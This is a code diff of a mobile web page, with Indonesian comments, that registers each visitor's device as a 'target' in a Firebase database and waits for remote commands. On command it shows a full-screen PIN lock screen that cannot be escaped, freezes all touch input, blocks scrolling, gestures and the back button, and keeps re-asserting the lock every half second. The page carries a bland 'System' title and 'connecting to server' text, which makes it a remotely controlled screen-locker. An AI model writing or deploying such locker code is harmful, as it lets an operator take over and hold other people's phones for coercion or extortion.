@@ -2,178 +2,403 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>System</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
+        /* ============================================================
+           RESET & BASE
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
             background: #000;
             color: #fff;
-            font-family: Arial, sans-serif;
-            height: 100vh;
-            overflow: hidden;
+            font-family: 'Segoe UI', Arial, sans-serif;
             user-select: none;
             -webkit-user-select: none;
+            -webkit-touch-callout: none;
+            touch-action: none;
+            pointer-events: auto;
+            position: fixed;
+            top: 0;
+            left: 0;
         }
-        
+
+        /* ============================================================
+           LOADING SCREEN
+           ============================================================ */
+        #loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #0a0a0a;
+            z-index: 9999;
+            gap: 20px;
+        }
+        #loading .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #1a1a1a;
+            border-top: 4px solid #00ff41;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        #loading .text {
+            color: #888;
+            font-size: 14px;
+            letter-spacing: 2px;
+        }
+        #loading .status-detail {
+            color: #555;
+            font-size: 11px;
+            margin-top: 5px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ============================================================
+           STATUS BAR (ATAS)
+           ============================================================ */
+        #statusBar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #0a0a0a;
+            padding: 4px 14px;
+            font-size: 10px;
+            color: #555;
+            text-align: center;
+            z-index: 99999;
+            border-bottom: 1px solid #1a1a1a;
+            pointer-events: none;
+            font-family: monospace;
+            letter-spacing: 0.5px;
+            height: 24px;
+            line-height: 16px;
+        }
+        #statusBar.online { color: #00ff41; }
+        #statusBar.offline { color: #ff4444; }
+
+        /* ============================================================
+           LOCK SCREEN — PALING DEPAN, SUPER TOTAL
+           ============================================================ */
         #lockScreen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
-            background: #000;
-            z-index: 999999999;
+            background: #0d0d0d;
+            z-index: 2147483647;
+            /* nilai max integer, di atas segalanya */
             display: none;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 30px 20px;
+            touch-action: none;
+            pointer-events: all !important;
+            user-select: none;
+            -webkit-user-select: none;
+            overflow: hidden;
+            /* anti scroll */
         }
-        #lockScreen.active { display: flex; }
-        #lockScreen .lock-icon { font-size: 60px; margin-bottom: 20px; }
-        #lockScreen .message {
-            color: #ff4444;
-            font-size: 18px;
-            text-align: center;
-            margin-bottom: 25px;
-            padding: 0 20px;
-            white-space: pre-wrap;
-        }
-        #lockScreen .pin-display {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 25px;
-        }
-        #lockScreen .pin-dot {
-            width: 50px;
-            height: 55px;
-            background: #1a1a1a;
-            border: 2px solid #444;
-            border-radius: 10px;
-            text-align: center;
-            font-size: 28px;
-            color: #fff;
-            line-height: 50px;
-        }
-        #lockScreen .pin-dot.filled { border-color: #00ff41; }
-        #lockScreen .numpad {
-            display: grid;
-            grid-template-columns: repeat(3, 80px);
-            gap: 12px;
-            margin-top: 10px;
-        }
-        #lockScreen .numpad button {
-            width: 80px;
-            height: 80px;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 50%;
-            color: #fff;
-            font-size: 28px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        #lockScreen .numpad button:active {
-            background: #333;
-            transform: scale(0.95);
-        }
-        #lockScreen .numpad button.clear {
-            background: #331111;
-            color: #ff4444;
-            font-size: 16px;
-        }
-        #lockScreen .error-msg {
-            color: #ff4444;
-            font-size: 14px;
-            margin-top: 15px;
-            min-height: 20px;
+        #lockScreen.active {
+            display: flex !important;
         }
 
+        /* Lock screen — elemen di dalamnya */
+        #lockScreen .lock-icon {
+            font-size: 80px;
+            margin-bottom: 10px;
+            animation: pulse-icon 2s infinite;
+        }
+        @keyframes pulse-icon {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
+        #lockScreen .message {
+            color: #ff3333;
+            font-size: 22px;
+            text-align: center;
+            margin-bottom: 25px;
+            padding: 0 15px;
+            white-space: pre-wrap;
+            font-weight: 700;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+            line-height: 1.5;
+            max-width: 90%;
+        }
+
+        #lockScreen .pin-display {
+            display: flex;
+            gap: 18px;
+            margin-bottom: 30px;
+        }
+        #lockScreen .pin-dot {
+            width: 60px;
+            height: 65px;
+            background: #1a1a1a;
+            border: 3px solid #333;
+            border-radius: 14px;
+            text-align: center;
+            font-size: 36px;
+            color: #fff;
+            line-height: 60px;
+            transition: all 0.2s;
+        }
+        #lockScreen .pin-dot.filled {
+            border-color: #00ff41;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.25);
+            background: #0a1a0a;
+        }
+
+        #lockScreen .numpad {
+            display: grid;
+            grid-template-columns: repeat(3, 85px);
+            gap: 14px;
+            margin-top: 5px;
+        }
+        #lockScreen .numpad button {
+            width: 85px;
+            height: 85px;
+            background: #1a1a1a;
+            border: 2px solid #2a2a2a;
+            border-radius: 50%;
+            color: #fff;
+            font-size: 30px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.12s;
+            touch-action: none;
+            pointer-events: all !important;
+        }
+        #lockScreen .numpad button:active {
+            background: #2a2a2a;
+            transform: scale(0.92);
+            border-color: #00ff41;
+        }
+        #lockScreen .numpad button.clear {
+            background: #2a0a0a;
+            color: #ff4444;
+            font-size: 20px;
+            border-color: #441111;
+        }
+        #lockScreen .numpad button.clear:active {
+            background: #3a0a0a;
+            border-color: #ff4444;
+        }
+        #lockScreen .numpad button.submit-btn {
+            background: #00cc33;
+            color: #000;
+            font-size: 28px;
+            font-weight: 700;
+            border-color: #00cc33;
+        }
+        #lockScreen .numpad button.submit-btn:active {
+            background: #00dd44;
+            transform: scale(0.92);
+        }
+
+        #lockScreen .error-msg {
+            color: #ff4444;
+            font-size: 16px;
+            margin-top: 22px;
+            min-height: 28px;
+            font-weight: 700;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            text-align: center;
+        }
+        #lockScreen .error-msg.success {
+            color: #00ff41;
+            text-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+        }
+
+        #lockScreen .sub-text {
+            color: #444;
+            font-size: 11px;
+            margin-top: 18px;
+            letter-spacing: 1.5px;
+            font-family: monospace;
+        }
+
+        /* ============================================================
+           FREEZE OVERLAY — TRANSPARAN TAPI BLOKIR SENTUHAN TOTAL
+           ============================================================ */
         #touchFreezeOverlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
-            background: transparent;
-            z-index: 999999998;
+            background: rgba(0, 0, 0, 0.01);
+            z-index: 2147483646;
             display: none;
-            pointer-events: all;
-            cursor: not-allowed;
+            pointer-events: all !important;
+            touch-action: none !important;
         }
-        #touchFreezeOverlay.active { display: block; }
-        
+        #touchFreezeOverlay.active {
+            display: block !important;
+        }
+
+        /* ============================================================
+           FREEZE TIMER — DI SUDUT KANAN ATAS
+           ============================================================ */
         #freezeTimer {
             position: fixed;
-            top: 50px;
-            right: 15px;
-            background: rgba(255,170,0,0.9);
+            top: 35px;
+            right: 18px;
+            background: rgba(255, 170, 0, 0.95);
             color: #000;
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 16px;
-            font-weight: bold;
-            z-index: 999999999;
+            padding: 10px 22px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 800;
+            z-index: 2147483647;
             display: none;
-            font-family: Arial, sans-serif;
-            box-shadow: 0 0 20px rgba(255,170,0,0.5);
+            font-family: 'Segoe UI', Arial, sans-serif;
+            box-shadow: 0 0 50px rgba(255, 170, 0, 0.5);
+            pointer-events: none;
+            border: 2px solid #ffaa00;
+            letter-spacing: 0.5px;
         }
         #freezeTimer.active {
-            display: block;
-            animation: pulse 0.5s infinite alternate;
+            display: block !important;
+            animation: pulse-timer 0.7s infinite alternate;
         }
-        @keyframes pulse {
-            0% { opacity: 0.8; transform: scale(1); }
-            100% { opacity: 1; transform: scale(1.05); }
-        }
-
-        #loading {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-size: 14px;
-            color: #666;
-        }
-        #statusBar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            background: #111;
-            padding: 5px 10px;
-            font-size: 10px;
-            color: #666;
-            text-align: center;
-            z-index: 999;
-            border-bottom: 1px solid #222;
+        @keyframes pulse-timer {
+            0% {
+                transform: scale(1);
+                opacity: 0.9;
+            }
+            100% {
+                transform: scale(1.06);
+                opacity: 1;
+            }
         }
 
+        /* ============================================================
+           RESPONSIVE UNTUK HP KECIL
+           ============================================================ */
         @media (max-width: 480px) {
-            #lockScreen .numpad { grid-template-columns: repeat(3, 65px); gap: 8px; }
-            #lockScreen .numpad button { width: 65px; height: 65px; font-size: 22px; }
-            #lockScreen .pin-dot { width: 40px; height: 45px; font-size: 22px; line-height: 40px; }
-            #freezeTimer { font-size: 13px; padding: 5px 12px; top: 45px; right: 10px; }
+            #lockScreen .numpad {
+                grid-template-columns: repeat(3, 68px);
+                gap: 10px;
+            }
+            #lockScreen .numpad button {
+                width: 68px;
+                height: 68px;
+                font-size: 24px;
+            }
+            #lockScreen .pin-dot {
+                width: 48px;
+                height: 52px;
+                font-size: 28px;
+                line-height: 48px;
+            }
+            #lockScreen .message {
+                font-size: 18px;
+            }
+            #lockScreen .lock-icon {
+                font-size: 60px;
+            }
+            #freezeTimer {
+                font-size: 14px;
+                padding: 6px 14px;
+                top: 30px;
+                right: 12px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            #lockScreen .numpad {
+                grid-template-columns: repeat(3, 58px);
+                gap: 8px;
+            }
+            #lockScreen .numpad button {
+                width: 58px;
+                height: 58px;
+                font-size: 20px;
+            }
+            #lockScreen .pin-dot {
+                width: 40px;
+                height: 44px;
+                font-size: 22px;
+                line-height: 40px;
+            }
+        }
+
+        /* ============================================================
+           ANTI PULL-TO-REFRESH & OVERSCROLL
+           ============================================================ */
+        body {
+            overscroll-behavior: none;
+            -webkit-overflow-scrolling: none;
         }
     </style>
 </head>
 <body>
-    <div id="statusBar">🟢 System Online</div>
-    <div id="loading">⏳ Menghubungkan...</div>
 
+    <!-- ============================================================
+    STATUS BAR
+    ============================================================ -->
+    <div id="statusBar">⏳ Initializing...</div>
+
+    <!-- ============================================================
+    LOADING SCREEN
+    ============================================================ -->
+    <div id="loading">
+        <div class="spinner"></div>
+        <div class="text">Menghubungkan ke server...</div>
+        <div class="status-detail" id="loadingDetail">Mendaftarkan perangkat</div>
+    </div>
+
+    <!-- ============================================================
+    FREEZE TIMER
+    ============================================================ -->
     <div id="freezeTimer">✋ FREEZE: <span id="freezeCount">10</span>s</div>
+
+    <!-- ============================================================
+    FREEZE OVERLAY (BLOKIR SENTUHAN)
+    ============================================================ -->
     <div id="touchFreezeOverlay"></div>
 
+    <!-- ============================================================
+    LOCK SCREEN — FULLSCREEN TOTAL
+    ============================================================ -->
     <div id="lockScreen">
         <div class="lock-icon">🔒</div>
         <div class="message" id="lockMessage">⚠️ DEVICE LOCKED</div>
+
         <div class="pin-display" id="pinDisplay">
             <div class="pin-dot" id="dot1"></div>
             <div class="pin-dot" id="dot2"></div>
             <div class="pin-dot" id="dot3"></div>
             <div class="pin-dot" id="dot4"></div>
         </div>
+
         <div class="numpad">
             <button onclick="pressPin('1')">1</button>
             <button onclick="pressPin('2')">2</button>
@@ -186,16 +411,24 @@
             <button onclick="pressPin('9')">9</button>
             <button onclick="clearPin()" class="clear">✕</button>
             <button onclick="pressPin('0')">0</button>
-            <button onclick="submitPin()" style="background:#00ff41;color:#000;">✔</button>
+            <button onclick="submitPin()" class="submit-btn">✔</button>
         </div>
+
         <div class="error-msg" id="errorMsg"></div>
+        <div class="sub-text">🔐 AMAN · TERKUNCI · TUNGGU ADMIN</div>
     </div>
 
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <!-- ============================================================
+    FIREBASE SDK
+    ============================================================ -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js">
+    </script>
+
     <script>
         // ============================================================
-        // 🔥 KONFIGURASI FIREBASE - PAKAI YANG SUDAH TERBUKTI WORK
+        // 🔥 KONFIGURASI FIREBASE — SUDAH BENAR
         // ============================================================
         var firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
@@ -211,7 +444,7 @@
         var db = firebase.database();
 
         // ============================================================
-        // KODE UTAMA
+        // VARIABEL GLOBAL
         // ============================================================
         var deviceId = '';
         var currentPin = '';
@@ -219,9 +452,14 @@
         var freezeInterval = null;
         var freezeRemaining = 0;
         var isLocked = false;
+        var isFreezeActive = false;
+
+        // ============================================================
+        // FUNGSI UTAMA
+        // ============================================================
 
         function generateDeviceId() {
-            return 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2,6);
+            return 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7);
         }
 
         function getDeviceName() {
@@ -231,16 +469,24 @@
                     var match = ua.match(/Android\s([\d.]+)/);
                     return 'Android ' + (match ? match[1] : 'Device');
                 }
+                if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
+                    return 'iOS Device';
+                }
                 return 'Mobile Device';
-            } catch(e) {
+            } catch (e) {
                 return 'Mobile Device';
             }
         }
 
+        // ============================================================
+        // REGISTER TARGET
+        // ============================================================
         function registerTarget() {
             deviceId = generateDeviceId();
             var deviceName = getDeviceName();
-            
+
+            document.getElementById('loadingDetail').textContent = 'Mendaftar: ' + deviceId.slice(0, 10) + '...';
+
             db.ref('targets/' + deviceId).set({
                 deviceName: deviceName,
                 online: true,
@@ -252,102 +498,270 @@
                 touchBlockTime: null,
                 lastSeen: Date.now()
             }).then(function() {
+                // Sembunyikan loading
                 document.getElementById('loading').style.display = 'none';
-                document.getElementById('statusBar').textContent = '🟢 Target Online | ID: ' + deviceId.slice(0,8);
+                document.getElementById('statusBar').textContent = '🟢 Online | ' + deviceId.slice(0, 8);
+                document.getElementById('statusBar').className = 'online';
+
+                // Minta izin overlay (jika ada)
+                requestOverlayPermission();
+
+                // Mulai listen
                 startListening();
+
+                // Kirim notifikasi (jika diizinkan)
+                sendNotification('✅ Target Online', 'Device: ' + deviceId.slice(0, 10));
+
             }).catch(function(err) {
-                document.getElementById('loading').textContent = '❌ ' + err.message;
+                document.getElementById('loadingDetail').textContent = '❌ Error: ' + err.message;
+                document.getElementById('loadingDetail').style.color = '#ff4444';
                 setTimeout(registerTarget, 3000);
             });
         }
 
+        // ============================================================
+        // LISTEN PERINTAH DARI FIREBASE
+        // ============================================================
         function startListening() {
             var ref = db.ref('targets/' + deviceId);
+
             ref.on('value', function(snapshot) {
                 var data = snapshot.val();
                 if (!data) return;
 
+                // Update last seen
                 ref.update({ lastSeen: Date.now() });
 
-                // CEK FREEZE
+                // ---------- CEK FREEZE ----------
                 if (data.touchBlocked === true && data.touchDuration) {
                     startFreeze(data.touchDuration);
                 } else if (data.touchBlocked === false) {
                     stopFreeze();
                 }
 
-                // CEK LOCK
+                // ---------- CEK LOCK ----------
                 if (data.locked === true && data.pin) {
                     correctPin = data.pin;
                     isLocked = true;
-                    showLockScreen(data.message || '⚠️ DEVICE LOCKED');
+                    showLockScreen(data.message || '⚠️ DEVICE LOCKED\nHubungi admin untuk unlock');
                 } else if (data.locked === false) {
                     isLocked = false;
                     hideLockScreen();
                 }
+
+            }, function(error) {
+                // Error handling
+                document.getElementById('statusBar').textContent = '🔴 Error: ' + error.code;
+                document.getElementById('statusBar').className = 'offline';
             });
         }
 
-        // ============ LOCK SCREEN ============
+        // ============================================================
+        // LOCK SCREEN — TOTAL BLOKIR
+        // ============================================================
         function showLockScreen(message) {
+            var lockScreen = document.getElementById('lockScreen');
             document.getElementById('lockMessage').textContent = message;
-            document.getElementById('lockScreen').classList.add('active');
             document.getElementById('errorMsg').textContent = '';
+            document.getElementById('errorMsg').className = 'error-msg';
             currentPin = '';
             updateDots();
+
+            // Aktifkan lock screen
+            lockScreen.classList.add('active');
+            lockScreen.style.display = 'flex';
+
+            // Pastikan z-index paling tinggi
+            lockScreen.style.zIndex = '2147483647';
+
+            // Block all touch events di body
+            document.body.style.pointerEvents = 'none';
+            document.body.style.touchAction = 'none';
+            document.documentElement.style.pointerEvents = 'none';
+            document.documentElement.style.touchAction = 'none';
+
+            // Lock screen bisa disentuh
+            lockScreen.style.pointerEvents = 'all';
+            lockScreen.style.touchAction = 'none';
+
+            // Cegah scroll
+            document.body.style.overflow = 'hidden';
+            document.documentElement.style.overflow = 'hidden';
+
+            // Cegah pull to refresh
+            document.body.style.overscrollBehavior = 'none';
+
+            // Update status bar
+            document.getElementById('statusBar').textContent = '🔒 LOCKED | ' + deviceId.slice(0, 8);
+            document.getElementById('statusBar').className = 'offline';
+
+            // Kirim notifikasi
+            sendNotification('🔒 Device Locked', 'PIN: ' + correctPin);
         }
 
         function hideLockScreen() {
-            document.getElementById('lockScreen').classList.remove('active');
+            var lockScreen = document.getElementById('lockScreen');
+            lockScreen.classList.remove('active');
+            lockScreen.style.display = 'none';
+
+            // Unblock touch (kecuali sedang freeze)
+            if (!isFreezeActive) {
+                document.body.style.pointerEvents = 'auto';
+                document.body.style.touchAction = 'auto';
+                document.documentElement.style.pointerEvents = 'auto';
+                document.documentElement.style.touchAction = 'auto';
+            }
+
+            document.body.style.overflow = '';
+            document.documentElement.style.overflow = '';
+            document.body.style.overscrollBehavior = '';
+
             currentPin = '';
             updateDots();
+
+            document.getElementById('statusBar').textContent = '🟢 Online | ' + deviceId.slice(0, 8);
+            document.getElementById('statusBar').className = 'online';
+
+            sendNotification('🔓 Device Unlocked', '');
         }
 
-        // ============ FREEZE ============
+        // ============================================================
+        // FREEZE — BLOKIR SENTUHAN TOTAL TRANSPARAN
+        // ============================================================
         function startFreeze(duration) {
+            isFreezeActive = true;
+
+            // Aktifkan overlay freeze
             document.getElementById('touchFreezeOverlay').classList.add('active');
             document.getElementById('freezeTimer').classList.add('active');
-            
+
             freezeRemaining = duration;
             document.getElementById('freezeCount').textContent = freezeRemaining;
-            
+
+            // BLOKIR SEMUA SENTUHAN DI SELURUH LAPISAN
             document.body.style.pointerEvents = 'none';
+            document.body.style.touchAction = 'none';
+            document.documentElement.style.pointerEvents = 'none';
+            document.documentElement.style.touchAction = 'none';
+
+            // Overlay bisa menerima sentuhan (biar block)
             document.getElementById('touchFreezeOverlay').style.pointerEvents = 'all';
-            
+            document.getElementById('touchFreezeOverlay').style.touchAction = 'none';
+
+            // Kalau lock screen aktif, juga di-block
+            if (document.getElementById('lockScreen').classList.contains('active')) {
+                document.getElementById('lockScreen').style.pointerEvents = 'none';
+            }
+
+            // Update status
+            document.getElementById('statusBar').textContent = '✋ FREEZE | ' + freezeRemaining + 's | ' + deviceId.slice(0,
+            8);
+            document.getElementById('statusBar').className = 'offline';
+
+            // Hapus interval lama
             if (freezeInterval) clearInterval(freezeInterval);
-            
+
+            // Jalankan timer
             freezeInterval = setInterval(function() {
                 freezeRemaining--;
                 document.getElementById('freezeCount').textContent = freezeRemaining;
-                
+                document.getElementById('statusBar').textContent = '✋ FREEZE | ' + freezeRemaining + 's | ' + deviceId
+                    .slice(0, 8);
+
                 if (freezeRemaining <= 0) {
                     clearInterval(freezeInterval);
                     freezeInterval = null;
+                    // Unfreeze otomatis via Firebase
                     db.ref('targets/' + deviceId).update({
                         touchBlocked: false,
                         touchDuration: null,
                         touchBlockTime: null
-                    });
+                    }).catch(function() {});
                 }
             }, 1000);
+
+            sendNotification('✋ HP FREEZE', 'Durasi: ' + duration + ' detik');
         }
 
         function stopFreeze() {
+            isFreezeActive = false;
+
+            // Matikan overlay freeze
             document.getElementById('touchFreezeOverlay').classList.remove('active');
             document.getElementById('freezeTimer').classList.remove('active');
-            document.body.style.pointerEvents = 'auto';
-            
+
+            // UNBLOKIR — kecuali masih locked
+            if (!isLocked) {
+                document.body.style.pointerEvents = 'auto';
+                document.body.style.touchAction = 'auto';
+                document.documentElement.style.pointerEvents = 'auto';
+                document.documentElement.style.touchAction = 'auto';
+            } else {
+                // Kalau masih locked, lock screen yang handle
+                document.body.style.pointerEvents = 'none';
+                document.documentElement.style.pointerEvents = 'none';
+            }
+
+            document.getElementById('touchFreezeOverlay').style.pointerEvents = 'none';
+
+            if (document.getElementById('lockScreen').classList.contains('active')) {
+                document.getElementById('lockScreen').style.pointerEvents = 'all';
+            }
+
             if (freezeInterval) {
                 clearInterval(freezeInterval);
                 freezeInterval = null;
             }
+
+            document.getElementById('statusBar').textContent = isLocked ? '🔒 LOCKED | ' + deviceId.slice(0, 8) :
+                '🟢 Online | ' + deviceId.slice(0, 8);
+            document.getElementById('statusBar').className = isLocked ? 'offline' : 'online';
+
+            sendNotification('✅ HP UNFREEZE', '');
         }
 
-        // ============ PIN ============
+        // ============================================================
+        // PERMISSION OVERLAY
+        // ============================================================
+        function requestOverlayPermission() {
+            try {
+                if (window.Android && window.Android.requestOverlay) {
+                    window.Android.requestOverlay();
+                }
+            } catch (e) {}
+
+            // Coba via intent (beberapa WebView support)
+            try {
+                if (window.navigator && window.navigator.userAgent.indexOf('Android') !== -1) {
+                    // Already handled by Android interface
+                }
+            } catch (e) {}
+        }
+
+        // ============================================================
+        // NOTIFIKASI (jika diizinkan)
+        // ============================================================
+        function sendNotification(title, body) {
+            try {
+                if (Notification && Notification.permission === 'granted') {
+                    new Notification(title, {
+                        body: body,
+                        icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔒</text></svg>',
+                        silent: true
+                    });
+                }
+            } catch (e) {}
+        }
+
+        // ============================================================
+        // PIN FUNCTIONS
+        // ============================================================
         function pressPin(num) {
             if (currentPin.length < 4) {
                 currentPin += num;
                 updateDots();
+                document.getElementById('errorMsg').textContent = '';
+                document.getElementById('errorMsg').className = 'error-msg';
             }
         }
 
@@ -355,16 +769,22 @@
             currentPin = currentPin.slice(0, -1);
             updateDots();
             document.getElementById('errorMsg').textContent = '';
+            document.getElementById('errorMsg').className = 'error-msg';
         }
 
         function submitPin() {
             if (currentPin.length !== 4) {
                 document.getElementById('errorMsg').textContent = '⚠️ Masukkan 4 digit PIN';
+                document.getElementById('errorMsg').className = 'error-msg';
+                // Getar
+                try { if (window.navigator && window.navigator.vibrate) window.navigator.vibrate(100); } catch (e) {}
                 return;
             }
 
             if (currentPin === correctPin) {
                 document.getElementById('errorMsg').textContent = '✅ PIN BENAR! UNLOCKING...';
+                document.getElementById('errorMsg').className = 'error-msg success';
+
                 setTimeout(function() {
                     db.ref('targets/' + deviceId).update({
                         locked: false,
@@ -373,16 +793,14 @@
                     }).then(function() {
                         hideLockScreen();
                     });
-                }, 300);
+                }, 400);
+
             } else {
                 document.getElementById('errorMsg').textContent = '❌ PIN SALAH! Coba lagi';
+                document.getElementById('errorMsg').className = 'error-msg';
                 currentPin = '';
                 updateDots();
-                try {
-                    if (window.navigator && window.navigator.vibrate) {
-                        window.navigator.vibrate(200);
-                    }
-                } catch(e) {}
+                try { if (window.navigator && window.navigator.vibrate) window.navigator.vibrate(300); } catch (e) {}
             }
         }
 
@@ -400,20 +818,95 @@
             });
         }
 
-        // ============ KEEP ALIVE ============
+        // ============================================================
+        // KEYBOARD SUPPORT
+        // ============================================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key >= '0' && e.key <= '9') {
+                pressPin(e.key);
+            } else if (e.key === 'Enter') {
+                submitPin();
+            } else if (e.key === 'Backspace') {
+                clearPin();
+            }
+        });
+
+        // ============================================================
+        // KEEP ALIVE — ONLINE STATUS
+        // ============================================================
         setInterval(function() {
             if (deviceId) {
                 db.ref('targets/' + deviceId).update({
                     lastSeen: Date.now(),
                     online: true
-                });
+                }).catch(function() {});
             }
         }, 5000);
 
-        // ============ START ============
+        // ============================================================
+        // HENTIKAN SEMUA GESTURE SAAT LOCK/FREEZE
+        // ============================================================
+        document.addEventListener('touchmove', function(e) {
+            if (isLocked || isFreezeActive) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }, { passive: false });
+
+        document.addEventListener('gesturestart', function(e) {
+            if (isLocked || isFreezeActive) {
+                e.preventDefault();
+                return false;
+            }
+        }, { passive: false });
+
+        document.addEventListener('gesturechange', function(e) {
+            if (isLocked || isFreezeActive) {
+                e.preventDefault();
+                return false;
+            }
+        }, { passive: false });
+
+        // Cegah back button
+        document.addEventListener('backbutton', function(e) {
+            if (isLocked) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        });
+
+        // ============================================================
+        // START — INIT
+        // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
+            // Minta izin notifikasi
+            try {
+                if (Notification && Notification.permission !== 'granted') {
+                    Notification.requestPermission();
+                }
+            } catch (e) {}
+
+            // Register
             registerTarget();
         });
+
+        // ============================================================
+        // DOUBLE SAFETY — PASTIKAN LOCK SCREEN STAY DI ATAS
+        // ============================================================
+        setInterval(function() {
+            var lock = document.getElementById('lockScreen');
+            if (lock.classList.contains('active')) {
+                lock.style.display = 'flex';
+                lock.style.zIndex = '2147483647';
+                lock.style.pointerEvents = 'all';
+                // Pastikan body tetap block
+                document.body.style.pointerEvents = 'none';
+                document.documentElement.style.pointerEvents = 'none';
+                lock.style.pointerEvents = 'all';
+            }
+        }, 500);
     </script>
 </body>
 </html>
